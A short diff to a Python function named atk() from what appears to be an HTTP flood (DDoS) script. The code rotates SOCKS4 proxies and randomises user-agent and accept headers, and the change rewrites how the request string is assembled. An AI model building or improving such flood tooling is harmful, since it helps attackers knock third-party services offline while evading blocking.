@@ -196,7 +196,7 @@ def atk():
 	proxy = random.choice(pprr).strip().split(":")
 	useragent = "User-Agent: " + random.choice(userag) + "\r\n"                                               #Code By GogoZin
 	accept = random.choice(acpt)
-	rqs = get_host + useragent + accept + connection + "\r\n"
+	rqs = useragent + accept + "\r\n"
 	s = requests.session()
 	s.proxies = {}
 	s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
